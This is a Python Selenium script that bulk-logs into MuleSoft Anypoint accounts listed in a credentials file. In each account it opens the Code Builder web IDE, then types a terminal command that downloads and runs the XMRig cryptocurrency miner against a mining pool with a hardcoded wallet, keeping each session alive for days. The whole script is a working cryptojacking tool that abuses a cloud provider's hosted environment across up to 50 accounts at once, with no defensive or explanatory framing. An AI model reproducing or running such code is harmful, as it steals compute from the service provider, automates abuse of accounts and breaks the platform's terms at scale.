from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
import time
import threading
import os

# Configuration
chrome_driver_path = "/usr/local/bin/chromedriver"
login_url = "https://anypoint.mulesoft.com/login/"
max_threads = 50
base_port = 5555
current_port = base_port
port_lock = threading.Lock()
focus_lock = threading.Lock()
sss = 1

# Read accounts
with open("acc.txt", "r") as file:
    accounts = [line.strip().split(":") for line in file.readlines()]

def get_next_port():
    """Thread-safe port assignment"""
    global current_port
    with port_lock:
        if current_port >= base_port + max_threads:
            raise Exception("No more ports available!")
        port = current_port
        current_port += 1
    return port

def open_browser(instance_number, email, password):
    global sss
    port = get_next_port()
    
    options = Options()
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--headless")
    options.add_argument(f"--remote-debugging-port={port}")
    options.add_argument("--window-size=800,600")
    options.add_experimental_option("excludeSwitches", ["enable-logging"])

    try:
        service = Service(executable_path=chrome_driver_path, port=port)
        driver = webdriver.Chrome(service=service, options=options)
        
        with focus_lock:
            driver.get(login_url)
            wait = WebDriverWait(driver, 30)

            try:
                username_field = wait.until(EC.presence_of_element_located((By.ID, "nameInput")))
                password_field = driver.find_element(By.ID, "passwordInput")
                username_field.send_keys(email)
                password_field.send_keys(password)
                password_field.send_keys(Keys.RETURN)
                print(f"[{email}] ✅ Login submitted.")
            except Exception as e:
                print(f"[{email}] ❌ Login fields not found: {e}")
                return

            if "codebuilder" not in driver.current_url:
                driver.get("https://anypoint.mulesoft.com/codebuilder/")

            try:
                launch_button = wait.until(EC.element_to_be_clickable((By.ID, "launch-your-webide-btn-card")))
                launch_button.click()
                print(f"[{email}] ✅ Clicked Launch button")
            except:
                print(f"[{email}] ❌ Launch button not found")
                return

            original_window = driver.current_window_handle
            WebDriverWait(driver, 30).until(EC.number_of_windows_to_be(2))

            for handle in driver.window_handles:
                if handle != original_window:
                    driver.switch_to.window(handle)
                    break

            print(f"[{email}] Switched to Code Builder window")
            time.sleep(150)

            actions = ActionChains(driver)
            actions.key_down(Keys.CONTROL).send_keys('`').key_up(Keys.CONTROL).perform()
            
            try:
                textarea = wait.until(EC.presence_of_element_located((By.CLASS_NAME, "xterm-screen")))
                textarea.click()
                print(f"[{email}] ✅ Command executed.")
            except:
                print(f"[{email}] ❌ Terminal area not found")
                return

            try:
                textarea1 = wait.until(EC.presence_of_element_located((By.CLASS_NAME, "xterm-helper-textarea")))
                textarea1.send_keys(f"wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz\ntar -xvf xmrig-6.22.2-linux-static-x64.tar.gz\ncd xmrig-6.22.2\n./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u BONK:mA914pP63TTdq1c8igHEtrKQyhdwz36yVVbQeAR6YnD.{email}#u7pd-53qq -p x --tls --threads=4 -k")
                textarea1.send_keys(Keys.ENTER)
                with threading.Lock():
                    sss += 1
                print(f"[{email}] ✅ Mining command executed")
            except:
                print(f"[{email}] ❌ Terminal input not found")

            time.sleep(259200)  # Keep session alive

    except Exception as e:
        print(f"[{email}] ❌ Error: {str(e)}")
    finally:
        try:
            driver.quit()
        except:
            pass

# Thread management
threads = []
for i, (email, password) in enumerate(accounts[:max_threads]):
    thread = threading.Thread(target=open_browser, args=(i, email, password))
    thread.start()
    threads.append(thread)
    time.sleep(5)  # Stagger thread starts

for thread in threads:
    thread.join()

print(f"✅ All Chrome instances completed. Total workers: {sss}")
